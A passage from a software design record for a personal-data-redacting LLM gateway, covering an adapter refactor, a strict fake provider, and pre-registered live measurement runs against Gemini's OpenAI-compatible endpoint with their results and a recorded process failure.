  and `usage` with its nested token details: the gateway must accept
  fields it does not use.
- **A refusal**: `message.content: null` with `message.refusal` set.
  Today that is a `bad_response` (a 502); the fake makes the case exist,
  and what the gateway should do with it is a decision for the adapter
  ADR, not a default.
- Streamed: a first chunk with `delta: {role: "assistant", content: ""}`;
  `"usage": null` in every chunk when `include_usage` is set, then a final
  `choices: []` chunk with `usage`, then `[DONE]`; the same `id` on every
  chunk; SSE comment lines (`: keep-alive`); `\r\n` line endings; extra
  per-chunk fields (such as an obfuscation padding field).
- Every finish reason the specification has, including those the gateway
  must refuse (`tool_calls`, `function_call`), and `length` with empty
  content.
- Errors: a 429 with a `Retry-After` header and the specification's error
  body; 401, 500, 503; a mid-stream `data: {"error": …}` event; a stream
  cut without `[DONE]`.

Where the strict fake and a real provider disagree with the gateway in
different ways, the fake's verdict is about the specification and the real
provider's about practice; both are reported, neither overrides the other.

### 6. The adapter: one OpenAI-compatible adapter, or a second one (options; waits for the user)

Today `src/providers/ollama.ts` (323 lines) holds two kinds of code: what
any OpenAI-compatible provider needs (the request body built field by
field, the size caps, the timeouts, the SSE reading, the order checks on
a stream, the failure mapping) and what is Ollama's (the comments about
`reasoning` and `"content":""`, the default base URL, an optional key).
Almost all of it is the first kind.

- **Option A: one OpenAI-compatible adapter with provider profiles.**
  Rename and generalise `ollama.ts` into `openai-compatible.ts`; a profile
  per provider (`ollama`, `gemini`) holds only data: whether a key is
  required, any measured quirk (for example accepted `reasoning_effort`
  values, or a finish-reason mapping), and nothing else. _Costs:_ a
  refactor of the adapter and its tests (renames, comments), with the
  Ollama path proved unchanged: every existing adapter test passes
  unedited apart from imports, the recorded Ollama stream still parses
  identically, and the adapter's mutation checks are run again. _Gains:_
  one stream reader, one set of order checks, one place a bug is fixed;
  the strict fake tests the code both providers use.
- **Option B: a second adapter, `gemini.ts`, beside `ollama.ts`.**
  _Costs:_ about 300 lines copied, two stream readers that will drift, a
  bug fixed in one and not the other, the strict fake run against both,
  twice the mutation checks. _Gains:_ the Ollama path is untouched, so
  nothing already measured can move.
- **Option C: a shared core and two thin adapters.** The provider-neutral
  parts move to a core module; `ollama.ts` and `gemini.ts` become small
  files around it. In practice it is option A with the profiles as
  modules instead of data; it costs a little more structure and gains
  room for a provider whose differences are behaviour rather than data.

**Recommendation: A**, with two conditions. First, the structure is
decided now but **each profile's contents are decided only from what 7b
measures**, not from the documentation's silences in section 4; a profile
starts empty and gains an entry only with the recorded evidence for it.
Second, **the Ollama path must be shown unchanged** before anything Gemini
is added: the refactor is its own step, with its own proof, like the moves
of Phase 6b. C if 7b finds a difference that is not expressible as data.
B only if keeping the Ollama code byte-for-byte untouched is worth two
copies of the stream reader.

**Not decided here, coming in 7b or later:** what the gateway does with a
refusal (content null), how a 429 reaches the client, and whether an
unsupported `reasoning_effort` value is rejected before it is sent.

**What 7b needs from the user:** a Gemini API key from Google AI Studio
(free tier), put in `.env` as `PSEUDONYM_PROVIDER_API_KEY` (gitignored,
never committed or logged), and the model name chosen from those AI Studio
offers on the free tier, for `PSEUDONYM_MODEL`.

**Decided (the user, 2026-10-07): option A, with both conditions.** 7b is
split: the offline work (the refactor, the strict fake) first, the live
calls to Gemini in a separate run, after the predictions below are
committed.

### 7. Predictions for the live run (written and committed before any call to Gemini)

- **P1, the `[DONE]` terminator.** The adapter treats a stream that ends
  without `data: [DONE]` as failed (`bad_response`): Ollama ends a stream
  that failed midway without it, so its absence is how a failure shows.
  Gemini's documentation does not say whether it sends `[DONE]`. **If it
  does not, every Gemini stream fails today**: every streamed request
  through the gateway would end in an error event, after the content had
  already been sent. The live run tests this; it is written here so that
  the run tests it rather than explains it afterwards.

### 8. A `spii` finish on a redacted request: an external check, surfaced, never mapped (decided 2026-10-07)

Gemini can stop a generation because it found "Sensitive Personally
Identifiable Information" (`spii`, section 4). **On a request that went
through the gateway, that is evidence that something the provider
considers personal data reached it unredacted**: an external check on the
gateway's core promise, by a system that knows nothing about our
placeholders. So it is **never quietly mapped to a finish reason** (not to
`content_filter`, not to `stop`).

**Where it goes in the response path:**

1. **The adapter** recognises it. Which raw values mean it (`spii`,
   `SPII`, a field beside the finish reason, or nothing at all because the
   endpoint folds it into `content_filter`) is a profile entry, filled only
   from what the live run measures (option A's first condition). On one, the
   adapter fails the call with its own failure kind (`personal_data_flagged`),
   never an ordinary finish.
2. **The gateway** answers that call with its own error, not the
   provider's answer: a 502 with the code `provider_flagged_personal_data`
   and a fixed message, so the client learns that the provider flagged
   personal data and that no answer is given. On a stream that has already
   started, it is the stream's error event with the same code (the path
   every mid-stream failure takes), after the text already restored.
3. **The log** gets an `error`-level entry, not `info`: a fixed message
   ("the provider flagged personal data in a redacted request"), the route,
   the provider profile's name and the raw finish value, and never any
   content (as every log line, ADR-014).

**What it does not prove on its own.** With names off (the default), a
name is sent as written by design, and so are the values documented as not
detected (postal addresses, for example); Gemini may flag those, and may
flag a placeholder it misreads. So a `spii` finish is **a signal to look
at**, not proof of a detector bug; that is why it is surfaced to the
client and logged loudly rather than handled. **If the endpoint folds
`spii` into `content_filter`**, the distinction is lost there, and that is
recorded as a finding: `content_filter` is not treated as `spii`, since
safety blocks share it.

**Built in the live run's step**, once the shape is measured; not in this
offline run (the refactor carries nothing Gemini-specific).

### 9. The offline run: the refactor and the strict fake (2026-10-07, no call to Gemini)

**The refactor (option A), proved unchanged.** `src/providers/ollama.ts`
was copied to `src/providers/openai-compatible.ts` and generalised:
`createOpenAICompatibleProvider(config, profile)`, `OpenAICompatibleConfig`
(the old `OllamaConfig`, unchanged), and `ProviderProfile`, which holds one
entry, `name`, since nothing has been measured yet. `ollama.ts` is now
Ollama's profile (`OLLAMA_PROFILE = { name: 'ollama' }`), its stream notes,
and the names every caller already imported, so no importer changed. The
three proofs the user set, all held:

1. **Tests:** the 106 provider tests (`ollama.test.ts`,
   `ollama-recorded-stream.test.ts`, `sse.test.ts`) pass with **no edit at
   all**, not even an import.
2. **The recorded Ollama stream** parses identically: a SHA-256 over every
   event the adapter yields, fed whole, in 4,096-byte pieces and in 7-byte
   pieces, is `769eeed3…2c29` (26 events) before and after.
3. **Mutations:** the same 15 adapter mutations, run with
   `scripts/mutate.ts` on `ollama.ts` before and on `openai-compatible.ts`
   after: 15 of 15 caught both times, with the same number of failing tests
   for each.

**Corrections to section 5's design**, found while building the fake from
the specification (OpenAI's Node SDK types, read 2026-10-07; the API
reference page refused automated reads):

- **`max_tokens` and `max_completion_tokens` together is not a
  specification violation**: the types define both and forbid neither.
  The check was dropped from the fake. The gateway refuses the pair itself
  (ADR-014's own rule, a 400 before any provider call); a test pins that
  the provider never sees it.
- **No duplicate-key or UTF-8 check.** The adapter builds the body with one
  `JSON.stringify` of one object, which cannot write a key twice or produce
  invalid UTF-8, so such a check could never fire and could not be shown to
  work. The fake checks that the body is JSON and an object.
- **Every check is labelled `spec:` or `policy:`.** `spec:` is the
  specification (unknown fields, `stream_options` without `stream: true`,
  more than 4 stop sequences, ranges, the header formats); `policy:` is the
  gateway's own stricter rule (no `user`, `tools`, `developer` role, `name`,
  content parts; `n` only 1; `response_format` only `text`/`json_object`),
  so a policy breach is never reported as a specification one.
- **The specification's `reasoning_effort` values are exactly the gateway's**
  (`none`, `minimal`, `low`, `medium`, `high`, `xhigh`, `max`). So `xhigh`
  and `max` are not a gateway error; they are outside **Gemini's**
  documented set (section 4), which the live run measures.

**The strict fake, built.** `test/support/strict-provider.ts` (the checks
and the full-shaped answers) and `test/integration/strict-provider.test.ts`
(59 tests, the real gateway and adapter against it). Results:

- **Requests:** 20 request shapes the gateway forwards (every sampling
  option, both token-limit names, both response formats, one stop string
  and four, the dropped `user` and `safety_identifier`, all seven
  `reasoning_effort` values, four stream variants): **0 violations**, and no
  client header reached the provider.
- **Answers handled as decided:** a complete answer with every optional
  field (only the content is passed on); a stream with `"usage": null` on
  every chunk, an obfuscation field, `: keep-alive` comments and CRLF line
  ends (content whole, one usage chunk, `[DONE]`); `length` with empty
  content; `tool_calls` and `function_call` refused (502
  `provider_bad_response`, or the same code as a stream's error event);
  401, 500 and 503 become 502 with nothing of the body; an error event
  mid-stream ends with `provider_error` after the text already sent; a
  stream cut before `[DONE]` ends with `provider_bad_response` after the
  text already sent.
- **Two open decisions pinned as today's behaviour, not endorsed:** a
  refusal (`content: null`, `refusal` set) is a 502
  `provider_bad_response`; a 429 with `Retry-After` is a 502
  `provider_error` and the `Retry-After` is dropped. Both stay open
  (section 6).
- **No finding against the gateway.** One test of mine was wrong (it
  expected the token-limit pair to be forwarded); corrected as above.

**Does the fake earn its place?** Eleven faults planted in the adapter
(F1–F11: `stream_options` always sent, an unknown field, a message `name`,
no `Bearer`, the wrong content type, `[DONE]` not required, error events
not recognised, `tool_calls` accepted, `usage: null` rejected, unknown
message fields rejected, a refusal read as an empty answer). The
strict-fake tests alone catch **11 of 11** (F7 only after its test checked
the error code rather than "an error": without recognition, an error event
still fails as a malformed chunk). The existing adapter tests catch **10 of
11**; **F9, rejecting `"usage": null` on a chunk, is caught only by the
strict fake**: the recorded Ollama stream has no `"usage": null` (0 of its
events), so a gateway that broke on it would pass every Ollama test and
fail on any provider that follows the specification. That is the kind of
fault section 5 built it for. The others it catches a second time, through
the whole gateway rather than the adapter alone.

### 10. The live run (approved 2026-10-07, with the user's additions)

**How it is run.** `scripts/measure-gemini.ts`: 18 calls (3 shape calls,
15 one-parameter probes), each through the real pipeline
(`parseChatRequest`, `redactRequest`, the adapter with a profile holding
only `{ name: 'gemini' }`), 15 s apart, never retried; a 429 or any status
other than 200 and 400 stops the run; a 400 is a probe's result; a stream
the adapter rejects is a finding, recorded, and the run moves on (the
adapter is not changed during a measurement). The request is refused
before sending if a planted synthetic value (the published Visa test card,
an `example.com` address) is in its bytes. `fetch` is wrapped to keep the
**response bytes before the adapter reads them** (after HTTP content
decoding, which `fetch` does itself), with the sent body and the response
headers, so a rejected stream keeps its evidence. Each run writes to its
own new folder, `test/fixtures/gemini-7b/attempt-N`, with an
`attempt.json` naming the mode, the model and the start time: a rerun
never overwrites an earlier attempt. The model is named on the command
line (`--model`), never taken from `.env`, which keeps the local Ollama
setup; so the command that produced a recording names the model that
produced it. Answers are never printed, only counts and shapes. Every
recording is scanned by `repo-hygiene.test.ts` before it is committed (a
model may invent a plausible number); the scan now reads `.sse` files,
shown to fail on a probe file holding a public address.

**The headers that leave the machine, measured** (`--headers`: the same
adapter and `fetch` against a server on 127.0.0.1; nothing sent to
Google), in the order they arrived: `host`, `connection: keep-alive`,
`content-type: application/json`, `authorization: Bearer <key>` (checked
equal to the configured key, never printed), `accept: */*`,
`accept-language: *`, `sec-fetch-mode: cors`, `user-agent: node`,
`accept-encoding: gzip, deflate`, `content-length`. Ten, the same for a
streamed request; no client header; `user-agent` carries no version.
Node's `fetch` speaks HTTP/1.1, so the same list goes to Google.

**Known limit of this measurement:** each probe is one call, so it shows
whether a parameter is accepted or rejected, not whether it takes effect.
**`seed` repeatability stays unmeasured** (it would need repeated calls
with the same seed and a comparison); recorded as a limit, not built.

**Attempt 1 (2026-10-07, 13:09 UTC): stopped after one call.** The model
sent was `PSEUDONYM_MODEL` as configured, `qwen3:8b`: the local Ollama
model, not a Gemini one. Google answered **404**
(`NOT_FOUND`, "models/qwen3:8b is not found for API version v1main, or is
not supported for generateContent"), and the run stopped by its own rule.
What reached Google: the request above (placeholders only), from this
machine, with the key. Nothing about P1 or `spii` was measured. One
finding from it: **Gemini's error body on this endpoint is a JSON array,
`[{"error": {"code", "message", "status"}}]`**, not the specification's
object `{"error": {…}}`. The adapter never reads an error body, so nothing
changes today; recorded because a client or a future adapter that parses
error bodies would meet it (also in the section 4 table). The response
came gzip-encoded, with `server: scaffolding on HTTPServer2`. Its files
are in `attempt-1/` (moved there when the folders were added; its
`attempt.json` written by hand and says so). Since then the model comes
from `--model` and `--headers` prints it before anything is sent.

**The model list** (`--list-models`: `GET {base}/models` with the key and
no content, so within section 2's policy), recorded in its own attempt
folder, before the 18 calls; the model for them is the user's choice from
it. **Attempt 2 (2026-10-07, 13:25 UTC):** 200, 10,052 bytes, 62 models
(Gemini, Gemma, embedding, image, video, audio, live and TTS models in one
list). Each entry is `{id, object: "model", owned_by: "google",
display_name}`: `display_name` is not in the specification, and **every
`id` carries a `models/` prefix** (`models/gemini-2.5-flash`), where
Gemini's own examples send the bare name as `model`. Which form the chat
endpoint accepts is measured by the run itself, not assumed. The list says
nothing about which models the free tier serves or at what rate limits.
Recordings and their metadata are kept byte for byte: the
`test/fixtures/gemini-7b/` folder is in `.prettierignore`, since
reformatting Google's bytes would destroy the evidence and leaving them
would fail `format:check`.

**The model for the run: `gemini-2.5-flash`** (the user's choice,
2026-10-07), chosen deliberately over the newer Flash models in the list:
the run measures the protocol, not the model. The 7a reading (section 4)
found that `reasoning_effort: "none"` turns thinking off only for 2.5
models, and that thinking "cannot be turned off for Gemini 2.5 Pro or 3
models"; on a model whose thinking cannot be switched off, the latency
figures would carry thinking time for no benefit to a protocol
measurement. It is sent in the **bare form** (`gemini-2.5-flash`), as in
Gemini's own examples, although the model list gives
`models/gemini-2.5-flash`; which form the chat endpoint accepts is
recorded as a finding either way. **A second reason the pick holds:** AI
Studio's rate-limit page (read by the user, 2026-10-07) shows
`gemini-2.5-flash` at **5 requests per minute, 250,000 tokens per minute,
20 requests per day**, and Gemini 2 Flash and Gemini 2.5 Pro at **0 / 0**:
no free allowance at all.

**The split (decided by the user, 2026-10-07, before any chat call).**
The day's allowance is 20 requests (it resets at midnight Pacific,
section 4) and the plan was 18, so the run is split. **First the three
shape calls only** (`s1` not streamed, `s2` streamed, `s3` streamed with
`stream_options.include_usage`): they answer P1 and the usage order, which
this phase exists for; spending the allowance on probes and then finding
every stream fails would be the wrong order. The run stops after them.
The probes follow in a later run, from a list proposed with its call
count before it runs; `reasoning_effort` is trimmed from seven values to
three (`none`, `medium`, `xhigh`). (Reversed 2026-10-10, before any probe
ran: all seven are measured, 15 probes; see "Amendment 2026-10-10: the
probe run" at the end of this section.) Spacing: 15 s after each call ends,
at most 4 a minute, within the 5.

**Pre-registered: the two-form model probe** (written before the run).
`s1` sends the bare name, `gemini-2.5-flash`. If it is answered **404**,
exactly one call follows, `s1-prefixed`, identical except for the model
`models/gemini-2.5-flash`; both are recorded. If the prefixed form also
fails, the run stops; if it succeeds, `s2` and `s3` use it. **This is not
a retry:** a retry repeats a failed request hoping for a different
answer, and the no-retry rule stands. `s1-prefixed` is a different
request that tests a question stated here in advance (which form of the
model name does the chat endpoint accept?), and it is made at most once,
only on a 404, which is the answer that asks the question. Any other
failure of `s1` is not followed by it.

**Attempt 3 (2026-10-07, 13:33 UTC): stopped after two calls, by the
pre-registered rule.** `s1` (bare name) was answered **404**, so
`s1-prefixed` followed once, and was answered **404** too; the run
stopped before `s2` and `s3`. Both bodies are the same array-shaped error:
"This model models/gemini-2.5-flash is no longer available to new users.
Please update your code to use models/gemini-3.8-flash … We recommend you
to use the Interactions API". Findings:

- **The model-name question is answered, though not the way it was
  framed:** the bare name reached the same model as the prefixed one (the
  error for the bare request names `models/gemini-2.5-flash`), so the
  endpoint accepts both forms; the 404 is about the model's availability
  to this account, not the name's form.
- **Neither the model list nor AI Studio's rate-limit page tells whether a
  model can be used.** `models/gemini-2.5-flash` is in the list (attempt 2) and AI Studio shows it at 5 / 250,000 / 20; it is still refused to a
  new user.
- **P1 and the usage order are still untested**: no chat call has
  succeeded.
- **The 404 uses the same status as an unknown model** (attempt 1), so a
  client of the gateway cannot tell "no such model" from "not available to
  you"; the gateway's 502 `provider_error` (the body is never read) hides
  both. Recorded, not changed.

Calls to `gemini-2.5-flash` today: 2, both 404. Whether a 404 counts
against the 20-a-day allowance is not known; AI Studio's usage page would
show it.

#### Amendment 2026-10-10: the probe run (registered before any probe)

Written on 2026-10-10. **No probe has been sent to any model.** This is the
plan for the probe run; it is committed and pushed before the run, and the
live-run guard (section 11 item 4) refuses to start unless the working tree
is clean and HEAD is an ancestor of the last known origin/main. The guard
shows that everything on disk was committed and pushed, not that this is
the plan (section 11, "What it does not do"); the commit carrying this
amendment is the record. The predictions below are the assistant's,
written before the run and reviewed by the user before committing.

**1. From 11 probes to 15, and why.** Section 10 trimmed `reasoning_effort`
from seven values to three, making 11 probes. All seven are measured
instead, 15 probes, for two reasons:

- **(a) The budget that justified the cut is gone.** The cut was made under
  `gemini-2.5-flash`'s 20 requests a day. The run's model is
  `gemini-3.5-flash-lite`, at 500 a day (section 11 item 2; see 7).
- **(b) The stronger reason is the product, not the budget.** All seven
  `reasoning_effort` values pass the gateway's schema and are forwarded
  (section 12, item 1), so all seven are things a client can send through
  Pseudonym today. Leaving four unmeasured leaves four values whose
  behaviour on this provider is unknown, and a rejection reaches the
  client as an opaque 502 (`provider_error`; the provider's body is never
  read).

**Both reasons are independent of any result: no probe has run.** Neither
depends on what a probe returns; (a) is a fact about the allowance, (b) a
fact about the gateway's schema.

**2. The run.** Model `gemini-3.5-flash-lite` (bare name, as in Attempt 4).
Each probe is Attempt 4's `s1` request (a system message "Be brief.", a user
message carrying `[CARD_1]` and `[EMAIL_1]` only, `stream: false`), through
the real pipeline, with exactly one parameter added. Not streamed. The
command, with the probes named so the shape calls are not run again:

```powershell
npx tsx --env-file=.env scripts/measure-gemini.ts --model gemini-3.5-flash-lite --out test/fixtures/gemini-7b --calls p01,p02,p03,p04,p05,p06,p07,p08,p09,p10,p11,p12,p13,p14,p15
```

The recording goes to the next unused `attempt-N` (attempt 5 if none is
added before), with `attempt.json` naming the commit (`head`) and the
origin/main it was compared with (`originMain`).

**3. The 15 probes, in the order sent, each with its prediction.**
"Accepted" means HTTP 200 and the adapter `ok`, unless the row says
otherwise. Confidence is the assistant's own.

| Probe | Parameter and value sent                      | Prediction                                                                | Confidence | Why                                                                                                                                                                                                                                                                                                                                                               |
| ----- | --------------------------------------------- | ------------------------------------------------------------------------- | ---------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| p01   | `temperature: 0`                              | accepted                                                                  | high       | Shown in Gemini's own examples for this endpoint (section 4).                                                                                                                                                                                                                                                                                                     |
| p02   | `top_p: 0.5`                                  | accepted                                                                  | medium     | Not documented on this endpoint, but the native API has top-p; ignored rather than honoured is possible and one call cannot tell (section 10's limit).                                                                                                                                                                                                            |
| p03   | `seed: 42`                                    | accepted                                                                  | medium     | Not documented here; the native API has a seed. Whether it is honoured stays unmeasured (section 10).                                                                                                                                                                                                                                                             |
| p04   | `frequency_penalty: 0.5`                      | accepted                                                                  | low        | The native API has a frequency penalty, but, from memory and not checked, some Gemini models have answered penalties with a 400 saying they are not enabled for that model.                                                                                                                                                                                       |
| p05   | `presence_penalty: 0.5`                       | accepted                                                                  | low        | As p04.                                                                                                                                                                                                                                                                                                                                                           |
| p06   | `stop: ["\n"]` (one stop string, a line feed) | accepted, `finish_reason` `stop`                                          | medium     | The native API has stop sequences; a one-sentence answer probably contains no line feed, so it ends normally.                                                                                                                                                                                                                                                     |
| p07   | `max_tokens: 16`                              | accepted: `finish_reason` `length`, content a cut-short, non-empty string | medium     | Attempt 4's `s1` on this model reported usage 29 + 22 = 51 with no separate reasoning count for an 84-character answer, so the default effort seems to spend few or no tokens on thinking, and 16 cuts the visible answer. The alternative: hidden thinking uses the budget, the answer has no text, and the adapter rejects a 200 (section 12's second outcome). |
| p08   | `response_format: {"type": "json_object"}`    | accepted, content a JSON string                                           | high       | Documented on this endpoint (section 4).                                                                                                                                                                                                                                                                                                                          |
| p09   | `reasoning_effort: "none"`                    | **rejected (400)**                                                        | low        | Gemini's documentation: `none` turns thinking off only for 2.5 models, and thinking "cannot be turned off for … 3 models"; this is a 3-family model. Against it: Attempt 4's usage suggests little or no thinking by default, so the layer might accept `none` and map it.                                                                                        |
| p10   | `reasoning_effort: "minimal"`                 | accepted                                                                  | medium     | In the documented set.                                                                                                                                                                                                                                                                                                                                            |
| p11   | `reasoning_effort: "low"`                     | accepted                                                                  | high       | In the documented set.                                                                                                                                                                                                                                                                                                                                            |
| p12   | `reasoning_effort: "medium"`                  | accepted                                                                  | high       | In the documented set.                                                                                                                                                                                                                                                                                                                                            |
| p13   | `reasoning_effort: "high"`                    | accepted, within 120 s                                                    | medium     | In the documented set; a one-sentence task on a lite model should not think for long. A timeout would be section 12's third outcome.                                                                                                                                                                                                                              |
| p14   | `reasoning_effort: "xhigh"`                   | **rejected (400)**                                                        | medium     | Outside the documented set (section 4). An unknown enum value is more likely refused than ignored; ignored (a 200 at the default effort) is the alternative, and the worse one for clients.                                                                                                                                                                       |
| p15   | `reasoning_effort: "max"`                     | **rejected (400)**                                                        | medium     | As p14.                                                                                                                                                                                                                                                                                                                                                           |

Predicted in sum: 12 accepted, 3 rejected (p09, p14, p15), none timed out.

**4. What each outcome means:** section 12, item 3, not restated here. In
short: a 400 is Google rejecting the parameter; a 200 that `complete()`
rejects is the adapter rejecting Google's answer, a different finding; no
answer within 120 s is a third thing. The recording keeps them apart by
storing each call's HTTP status and the adapter's outcome separately.

**5. Stop rules, as sections 10 and 11 already set them.** A 403, a 429,
or any status other than 200 and 400 stops the run at once, and nothing
further is sent; no call is retried. A 404 stops it too: section 11's
fallback chain was for choosing a model, and the model is now fixed. A 400
does not stop the run: it is a probe's result (section 10), and stopping
on it would leave the probes after the first rejection unmeasured. A call
with no answer within 120 s is recorded and the run goes on (section 12).
The script enforces each of these (`goesOn` in `measure-gemini.ts`).

**6. Spacing.** The script waits `SPACING_MS` = 15,000 ms before every call
after the first (`await sleep(SPACING_MS)`), and the wait starts only after
the previous call's response has been read to the end (`measure` awaits the
recorded body). So successive calls start at least 15 s apart whatever the
latency: at most 4 in any 60 s, against 15 a minute. Latency can only
lengthen the gap, never shorten it. The run takes at least 14 × 15 s =
3.5 minutes plus the calls' own time.

**7. Budget, per model, never summed across models.**

- **`gemini-3.5-flash-lite`:** 3 calls so far, all in Attempt 4
  (2026-10-07, 14:28 UTC: `s1`, `s2`, `s3`, all 200). None since: the
  guard, its tests and this plan made no call. **This run: at most 15**
  (fewer only if a stop rule fires), so at most 18 on this model in all.
  **Allowance: 15 a minute, 500 a day** (section 11 item 2, read by the user
  on AI Studio and not re-read for this plan; section 11 item 9 requires it
  to be checked on AI Studio before the run). The daily count resets at
  midnight Pacific, so Attempt 4's calls fall on an earlier day; whether
  anything else used this key on the run's day is not known to this record.
- **Other models, not part of this run:** `qwen3:8b` 1 call (404,
  Attempt 1); `gemini-2.5-flash` 2 calls (both 404, Attempt 3); the model
  list, 1 call (Attempt 2), which names no model.
- **Whether a 404 consumes allowance is still unknown.**

### 11. Pre-registration: the fallback model chain and Phase 7b live run plan (2026-10-07)

Recorded before any call to the chain, governing the live protocol run.

1. **The fallback model chain:**
   `gemini-3.5-flash-lite` → `gemini-3.1-flash-lite` → `gemini-3.8-flash`.

2. **Why this chain and order:**
   The lite models provide **15 RPM / 500 RPD**, compared to `gemini-3.8-flash`
   at **5 RPM / 20 RPD** — twenty-five times the daily request allowance.
   Attempting the lite models first preserves the limited daily quota and
   reduces rate-limit pressure for subsequent probe runs.

3. **Stopping condition for the chain:**
   The chain stops at the first HTTP 200 response that **actually carries
   assistant content**. An HTTP 200 response returning an empty body, an empty
   `choices` array, or an explicit refusal (`message.content: null` with
   `message.refusal` set) does not constitute a successful shape measurement.
   Such a response must be recorded as an unsuccessful measurement rather than
   treated as a stop for the chain.

4. **Error handling rules (registered before the fact):**
   - **HTTP 404**: advance to the next model in the fallback chain.
   - **HTTP 403 or 429**: stop the run immediately; do not advance to the next
     model.
   - **Any other non-200 status**: stop the run immediately.

5. **Why this 404 rule differs from Attempt 3's:**
   Attempt 3 registered a rule that stopped on a 404 (after testing the two
   name forms of one model), and that rule fired as planned. This section
   registers a rule that advances on a 404.
   The reason for the difference is structural:
   - Attempt 3 governed two name-form representations of a **single model**
     (`gemini-2.5-flash` vs `models/gemini-2.5-flash`). Once both forms returned
     404, it was established that the model itself was unavailable to this
     account; attempting further requests to that same model would have been a
     blind retry.
   - This rule governs a fallback chain across **distinct candidate models**,
     where the explicit purpose of the chain is to identify an accessible
     active model.
     The earlier rule is **not** being relaxed because it was inconvenient; it
     performed exactly as designed and still stands for its own scope. A reader
     can distinguish them plainly: single-model name variants stop; distinct-model
     fallback advances.

6. **Model name form resolved by Attempt 3:**
   Attempt 3's two-form 404 established that the chat endpoint accepts both the
   bare identifier and the `models/` prefixed identifier (both resolved to
   `models/gemini-2.5-flash` in the error response). The 404 was purely about
   model availability for this account, not name formatting. Models in this
   chain are sent in their standard bare form.

7. **Unresolved oddity across Google surfaces (stated as unresolved):**
   `models/gemini-3.8-flash` does not appear in the 62-model list returned by
   `GET /v1beta/openai/models` for this key (Attempt 2). Yet the AI Studio
   rate-limit page explicitly lists `gemini-3.8-flash`, and Google's own 404
   response on Attempt 3 explicitly recommended `models/gemini-3.8-flash`.
   Three Google surfaces directly disagree with one another. We record this
   discrepancy as unresolved without picking a winner.

8. **Execution order:**
   The 3 shape calls (`s1` non-streaming, `s2` streamed, `s3` streamed with
   `stream_options.include_usage`) are run first as their own isolated run.
   The 11 one-parameter probes (15 since the section 10 amendment of
   2026-10-10) form a separate, subsequent run after shape
   compatibility is confirmed.

9. **Budget and quota confirmation:**
   The active model's confirmed RPM and RPD must be verified on AI Studio
   before execution. It remains unknown whether HTTP 404 responses consume
   any of the daily request allowance; that will be checked against the
   AI Studio usage dashboard.

10. **Pre-registered Predictions (P1 and usage payload):**
    - **Will a Gemini stream end with `data: [DONE]`?**
      **Prediction: YES.**
      _Reasoning_: Standard OpenAI client SDKs require the literal
      `data: [DONE]` terminator to close streaming connections cleanly without
      hanging or throwing socket termination errors; an OpenAI-compatible
      endpoint omitting it would break drop-in client compatibility.
    - **Where will usage statistics appear in the streaming payload?**
      **Prediction: In a final separate chunk before `[DONE]` with `choices: []`.**
      _Reasoning_: This follows OpenAI's streaming usage specification
      (`stream_options.include_usage`) and matches Google's documented example
      showing usage delivered at the tail of the stream.

**Attempt 4 (2026-10-07, 14:28 UTC): `gemini-3.5-flash-lite`, the 3 shape calls.**
The first model in the fallback chain was accepted (HTTP 200 on all 3 calls);
the chain stopped here. Three calls made, 15 s apart:

- **`s1` (not streamed): 200 OK, 540 B, 1,787 ms.**
  - Outcome: adapter `ok`, `finishReason: "stop"`, `usage: true`.
  - Body: choices length 1, `message.content` string of 84 characters.
  - The model echoed both placeholders (`[CARD_1]`, `[EMAIL_1]`) as written;
    0 raw digit runs.
  - Extra field: `message.extra_content` was present (Google metadata).
- **`s2` (streamed): 200 OK, 1,069 B, 2,313 ms.**
  - Outcome: adapter `ok`, 3 content events, `finishReason: "stop"`.
  - Stream shape: 5 data chunks, `finish_reason: "stop"` on chunk 4.
  - Content length 93, both placeholders preserved.
  - **Prediction P1 confirmed: stream ends with `data: [DONE]`.**
- **`s3` (streamed with usage): 200 OK, 1,338 B, 2,777 ms.**
  - Outcome: adapter `failed` (`bad_response`).
  - Stream shape: 5 data chunks, ending with `data: [DONE]`.
  - **Why the adapter failed:** Google sent `usage` on **all 4 chunks**
    (incremental/cumulative tokens as chunks arrive), not in a single trailing
    chunk after `finish_reason`. The adapter's `streamEvents` enforces that
    `usage` arrives only after `finish` and only once; receiving `usage` on
    chunk 1 tripped the out-of-order check (`bad_response`).
  - Extra field: chunk 4 included `delta.extra_content.google.thought_signature`.

Calls to Google in this attempt: 3.
Budget consumed: 3 requests of the free-tier daily allowance.
Cumulative calls today: 7 (attempt 1: 1; attempt 2: 1 list-models; attempt 3: 2; attempt 4: 3).

#### PROCESS FAILURE: this section was not committed before Attempt 4 ran (recorded 2026-10-08)

**Attempt 4 carries no pre-registration guarantee.** Read the rest of this
section with that in mind.

1. **What happened.** The text of this section, items 1 to 10 above, was
   written and staged before Attempt 4. No live call had been made at that
   point. **It was not committed before the run.** The commit planned for
   it was never run:
   `docs: pre-register Phase 7b fallback model chain and live run plan`.
   The last commit before the run was `97a7bd6 ignore`. Attempt 4's three
   calls were made while this section was still uncommitted. The commit that carries this section also carries Attempt
   4's results and recordings (`test/fixtures/gemini-7b/attempt-4/`).
2. **What that means.** The project's rule is that an ADR governing a
   measurement is committed before that measurement runs (rule 6 of the
   project brief). This one was not. **Attempt 4 therefore does not carry a
   pre-registration guarantee.** The history cannot show that the chain,
   the stopping and error rules, or the two predictions in item 10 were
   fixed before the results were seen. Calling them "pre-registered" or
   "registered before the fact" is not supported by the history. That
   wording stays above as it was written and staged; this subsection
   overrides it.
3. **What evidence of order exists, and how weak it is.** Both pieces below
   are **weaker than a commit**. They are evidence, not proof.
   - **The session record.** The working session shows this section
     written and staged before the first call of Attempt 4. A session
     record is not in the repository, is not timestamped by git, and
     cannot be checked by a reader of the history.
   - **The predictions were half wrong.** Item 10 predicted `data: [DONE]`
     at the end of a stream (**confirmed**: `s2` and `s3` both end with it)
     and usage in one final separate chunk with `choices: []` (**refuted**:
     `s3` carries `usage` on all four chunks and has no separate usage
     chunk). A prediction written after seeing the result would not have
     been wrong. This makes it likely that item 10 was written first, but it
     does not prove it.
   - **What the history does hold.** The only prediction committed before
     any call to Gemini is section 7's P1, and it is conditional: it says
     what follows _if_ Gemini omits `[DONE]`, not whether it will. The
     directional predictions (`[DONE]` yes; usage in a trailing chunk) exist
     only in this uncommitted section. "Prediction P1 confirmed" in Attempt
     4's record above refers to item 10's directional form, not to anything
     committed.
4. **The mechanism that replaces the discipline: a guard in code.**
   Discipline failed here, so a check replaces it, and the check is in the
   code, not in a list of things to remember.

   **First recorded, then replaced (2026-10-08).** This item first recorded
   a manual check: before any live run, run `git log -1 --format="%H %s"`
   and confirm that the plan's commit is in history; if not, stop. It was
